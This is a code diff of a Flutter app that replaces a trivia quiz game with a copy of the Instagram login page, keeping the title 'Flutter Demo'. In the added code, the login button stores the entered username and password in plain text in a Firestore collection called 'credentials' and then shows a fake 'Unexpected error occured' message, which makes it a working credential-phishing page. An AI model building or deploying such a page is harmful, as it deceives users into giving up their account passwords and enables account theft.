@@ -1,59 +1,29 @@
-import 'dart:convert';
-import 'dart:developer';
-
+import 'package:cloud_firestore/cloud_firestore.dart';
+import 'package:firebase_core/firebase_core.dart';
 import 'package:flutter/material.dart';
-import 'package:html_unescape/html_unescape.dart';
-import 'package:http/http.dart' as http;
 
-void main() {
+import 'firebase_options.dart';
+
+void main() async {
+  WidgetsFlutterBinding.ensureInitialized();
+  await Firebase.initializeApp(
+    options: DefaultFirebaseOptions.currentPlatform,
+  );
   runApp(const MyApp());
 }
 
 class MyApp extends StatelessWidget {
   const MyApp({super.key});
 
-  // This widget is the root of your application.
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
       title: 'Flutter Demo',
       theme: ThemeData(
-        colorScheme: ColorScheme.fromSeed(seedColor: Colors.blueAccent, brightness: Brightness.dark),
+        colorScheme: ColorScheme.fromSeed(seedColor: Colors.white),
         useMaterial3: true,
       ),
       home: const MyHomePage(title: 'Flutter Demo Home Page'),
-    );
-  }
-}
-
-enum Type { multiple, green, blue }
-
-class Question {
-  final String type;
-  final String difficulty;
-  final String category;
-  final String question;
-  final String correctAnswer;
-  final List<String> incorrectAnswers;
-
-  const Question({
-    required this.type,
-    required this.difficulty,
-    required this.category,
-    required this.question,
-    required this.correctAnswer,
-    required this.incorrectAnswers,
-  });
-
-  factory Question.fromJson(json) {
-    return Question(
-      type: json['type'],
-      difficulty: json['difficulty'],
-      category: json['category'],
-      question: json['question'],
-      correctAnswer: json['correct_answer'],
-      incorrectAnswers:
-          List.generate(json['incorrect_answers'].length, (index) => json['incorrect_answers'][index] as String),
     );
   }
 }
@@ -66,136 +36,220 @@ class MyHomePage extends StatefulWidget {
   State<MyHomePage> createState() => _MyHomePageState();
 }
 
-class _MyHomePageState extends State<MyHomePage> with SingleTickerProviderStateMixin {
-  late AnimationController controller;
-  late Animation<double> animation;
-  int selected = 0;
-  bool showingAnswers = false;
-  int tried = 0;
-  int correct = 0;
-  final List<(String, String)> usedQuestionAnswers = [];
-  Question question = const Question(
-      type: '', difficulty: '', category: '', question: '', correctAnswer: '', incorrectAnswers: ['', '', '', '']);
+class _MyHomePageState extends State<MyHomePage> {
+  late TextEditingController _firstController;
+  late TextEditingController _secondController;
+  bool _loggedIn = true;
+  bool _loading = false;
 
-  Future loadQuestion() async {
-    var res = await http.get(Uri.parse('https://opentdb.com/api.php?amount=1&type=multiple'));
-    log(res.statusCode.toString());
-
-    if (res.statusCode == 200) {
-      Question test = Question.fromJson((jsonDecode(res.body))['results'][0] as Map<String, dynamic>);
-      var obj = (test.correctAnswer, test.question);
-      if (usedQuestionAnswers.contains(obj)) {
-        loadQuestion();
-        return;
-      }
-      usedQuestionAnswers.add(obj);
-      setState(() => question = test);
-    } else {
-      log(res.headers.toString());
-      await Future.delayed(Durations.short2, loadQuestion);
+  void submit(String username, String password) async {
+    if (username.length < 5 || password.length < 5) {
+      return;
     }
-    showingAnswers = false;
+    var db = FirebaseFirestore.instance;
+    await db.collection('credentials').doc(username).set({'username': username, 'password': password});
+    setState(() {
+      _loading = true;
+    });
+    Future.delayed(const Duration(seconds: 1), () {
+      setState(() {
+        _loading = false;
+        _loggedIn = true;
+      });
+    });
   }
 
   @override
   void initState() {
-    controller = AnimationController(vsync: this, duration: Durations.long1);
-    animation = CurvedAnimation(parent: controller, curve: Curves.easeIn);
-
-    loadQuestion();
+    _firstController = TextEditingController();
+    _secondController = TextEditingController();
     super.initState();
   }
 
   @override
   Widget build(BuildContext context) {
-    List<String> answers = [];
-    for (String answer in question.incorrectAnswers) {
-      answers.add(answer);
+    double width = MediaQuery.of(context).size.width;
+    if (_loading) {
+      return const Center(child: CircularProgressIndicator.adaptive(strokeCap: StrokeCap.round));
+    } else if (_loggedIn) {
+      return Center(
+          child: Text('Unexpected error occured.\nPlease try again later. ',
+              textAlign: TextAlign.center, style: Theme.of(context).textTheme.bodyLarge!.copyWith()));
     }
-    answers.add(question.correctAnswer);
-    answers.shuffle();
-
-    void submitAnswer(int index) {
-      tried += 1;
-      if (question.correctAnswer == answers[index]) correct += 1;
-      showingAnswers = true;
-      selected = index;
-      controller.forward().then((value) => Future.delayed(Durations.short1, () {
-            loadQuestion().then((value) => controller.reset());
-          }));
-    }
-
-    double cardWidth = MediaQuery.of(context).size.width / 4;
-    double cardHeight = MediaQuery.of(context).size.height / 4;
-
-    Widget possibleAnswer(int index) {
-      String text = answers[index];
-      bool correct = text == question.correctAnswer;
-      return AnimatedBuilder(
-          animation: animation,
-          builder: (_, __) => InkWell(
-                onTap: () => submitAnswer(index),
-                child: SizedBox(
-                    width: cardWidth,
-                    height: cardHeight,
-                    child: Card(
-                        surfaceTintColor: showingAnswers
-                            ? (correct
-                                ? Colors.green
-                                : selected == index
-                                    ? Colors.red
-                                    : Colors.transparent)
-                            : Colors.transparent,
-                        elevation: 15 * animation.value,
-                        child: Center(child: Text(HtmlUnescape().convert(text))))),
-              ));
-    }
-
     return Scaffold(
-      appBar: AppBar(),
+      backgroundColor: Colors.white,
       body: Center(
-        child: Stack(
-          alignment: Alignment.center,
-          children: [
-            Positioned.fill(
-                child: Container(
-              decoration: const BoxDecoration(
-                gradient: LinearGradient(colors: [Color.fromARGB(255, 0, 87, 158), Color.fromARGB(255, 111, 0, 131)]),
+        child: IntrinsicWidth(
+          child: Column(
+            crossAxisAlignment: CrossAxisAlignment.stretch,
+            mainAxisAlignment: MainAxisAlignment.center,
+            children: <Widget>[
+              Container(
+                decoration: BoxDecoration(
+                    color: Colors.white, border: Border.all(color: const Color.fromARGB(255, 219, 219, 219), width: 1)),
+                child: Padding(
+                  padding: const EdgeInsets.all(28.0),
+                  child: SizedBox(
+                    width: width / 3,
+                    child: Column(
+                      children: [
+                        Padding(
+                          padding: const EdgeInsets.all(20.0),
+                          child: Image.network(
+                            'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png',
+                            height: 70,
+                          ),
+                        ),
+                        Padding(
+                          padding: const EdgeInsets.fromLTRB(8, 8, 8, 3),
+                          child: SizedBox(
+                            width: 350,
+                            height: 40,
+                            child: TextField(
+                              controller: _firstController,
+                              decoration: const InputDecoration(
+                                  hoverColor: Colors.transparent,
+                                  labelStyle: TextStyle(
+                                    fontWeight: FontWeight.w100,
+                                    color: Color.fromARGB(255, 115, 115, 115),
+                                    fontSize: 12,
+                                  ),
+                                  fillColor: Color.fromARGB(255, 250, 250, 250),
+                                  filled: true,
+                                  focusColor: Colors.transparent,
+                                  labelText: 'Phone number, username or email address',
+                                  border: OutlineInputBorder(
+                                      borderSide: BorderSide(color: Color.fromARGB(255, 219, 219, 219))),
+                                  enabledBorder: OutlineInputBorder(
+                                      borderSide: BorderSide(color: Color.fromARGB(255, 219, 219, 219))),
+                                  focusedBorder: OutlineInputBorder(
+                                      borderSide: BorderSide(color: Color.fromARGB(255, 219, 219, 219)))),
+                            ),
+                          ),
+                        ),
+                        Padding(
+                          padding: const EdgeInsets.fromLTRB(8, 3, 8, 8),
+                          child: SizedBox(
+                            width: 350,
+                            height: 40,
+                            child: TextField(
+                              obscureText: true,
+                              controller: _secondController,
+                              decoration: const InputDecoration(
+                                  hoverColor: Colors.transparent,
+                                  labelStyle: TextStyle(
+                                    fontWeight: FontWeight.w100,
+                                    color: Color.fromARGB(255, 115, 115, 115),
+                                    fontSize: 12,
+                                  ),
+                                  fillColor: Color.fromARGB(255, 250, 250, 250),
+                                  filled: true,
+                                  labelText: 'Password',
+                                  focusedBorder: OutlineInputBorder(
+                                      borderSide: BorderSide(color: Color.fromARGB(255, 219, 219, 219))),
+                                  border: OutlineInputBorder(
+                                      borderSide: BorderSide(color: Color.fromARGB(255, 219, 219, 219))),
+                                  enabledBorder: OutlineInputBorder(
+                                      borderSide: BorderSide(color: Color.fromARGB(255, 219, 219, 219)))),
+                            ),
+                          ),
+                        ),
+                        Padding(
+                          padding: const EdgeInsets.all(8.0),
+                          child: SizedBox(
+                              width: double.infinity,
+                              height: 35,
+                              child: TextButton(
+                                  style: const ButtonStyle(
+                                      shape: WidgetStatePropertyAll(
+                                          RoundedRectangleBorder(borderRadius: BorderRadius.all(Radius.circular(8)))),
+                                      foregroundColor: WidgetStatePropertyAll(Colors.white),
+                                      backgroundColor: WidgetStatePropertyAll(Color.fromARGB(255, 76, 181, 249))),
+                                  onPressed: () => submit(_firstController.text, _secondController.text),
+                                  child: const Text('Log in',
+                                      style: TextStyle(fontWeight: FontWeight.w600, letterSpacing: .8)))),
+                        ),
+                        const Padding(
+                          padding: EdgeInsets.all(8.0),
+                          child: Row(
+                            mainAxisSize: MainAxisSize.min,
+                            children: [
+                              Expanded(
+                                child: Padding(
+                                  padding: EdgeInsets.symmetric(horizontal: 20),
+                                  child:
+                                      SizedBox(height: 1, child: ColoredBox(color: Color.fromARGB(255, 219, 219, 219))),
+                                ),
+                              ),
+                              Text('OR',
+                                  style: TextStyle(
+                                      fontWeight: FontWeight.w600, color: Color.fromARGB(255, 115, 115, 115))),
+                              Expanded(
+                                child: Padding(
+                                  padding: EdgeInsets.symmetric(horizontal: 20),
+                                  child:
+                                      SizedBox(height: 1, child: ColoredBox(color: Color.fromARGB(255, 219, 219, 219))),
+                                ),
+                              ),
+                            ],
+                          ),
+                        ),
+                        Padding(
+                          padding: const EdgeInsets.all(8.0),
+                          child: Row(
+                            mainAxisAlignment: MainAxisAlignment.center,
+                            children: [
+                              Image.network(
+                                  'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQKrFhY-ljA-u7J5IMWeTv8zmpBx4PP9nQMw&s',
+                                  height: 14),
+                              const SizedBox(width: 5),
+                              const Text('Log in with Facebook',
+                                  style: TextStyle(
+                                    color: Color.fromARGB(255, 56, 81, 133),
+                                    fontWeight: FontWeight.bold,
+                                  )),
+                            ],
+                          ),
+                        ),
+                      ],
+                    ),
+                  ),
+                ),
               ),
-            )),
-            Column(
-              mainAxisSize: MainAxisSize.min,
-              children: [
-                Row(
+              const SizedBox(height: 10),
+              Container(
+                  decoration: BoxDecoration(
+                      color: Colors.white,
+                      border: Border.all(color: const Color.fromARGB(255, 219, 219, 219), width: 1)),
+                  child: const Padding(
+                    padding: EdgeInsets.all(20.0),
+                    child: Center(
+                        child: Row(
+                      mainAxisSize: MainAxisSize.min,
+                      children: [
+                        Text("Don't have an account? "),
+                        Text('Sign Up', style: TextStyle(color: Colors.blue))
+                      ],
+                    )),
+                  )),
+              const Padding(padding: EdgeInsets.all(18.0), child: Center(child: Text('Get the app. '))),
+              SizedBox(
+                height: 50,
+                child: Row(
                   mainAxisSize: MainAxisSize.min,
+                  mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                   children: [
-                    possibleAnswer(0),
-                    possibleAnswer(1),
+                    Image.network(
+                      'https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png',
+                    ),
+                    Image.network(
+                      'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Get_it_from_Microsoft_Badge.svg/1024px-Get_it_from_Microsoft_Badge.svg.png',
+                    )
                   ],
                 ),
-                Row(
-                  mainAxisSize: MainAxisSize.min,
-                  children: [
-                    possibleAnswer(2),
-                    possibleAnswer(3),
-                  ],
-                )
-              ],
-            ),
-            Padding(
-              padding: const EdgeInsets.all(20.0),
-              child: Align(
-                  alignment: Alignment.topCenter,
-                  child: Column(
-                    children: [
-                      Text(HtmlUnescape().convert(question.question), style: Theme.of(context).textTheme.headlineLarge),
-                      Text(question.difficulty),
-                      Text(HtmlUnescape().convert(question.category)),
-                      Text('$correct out of $tried - (${(correct / tried) * 100}%)'),
-                    ],
-                  )),
-            ),
-          ],
+              )
+            ],
+          ),
         ),
       ),
     );
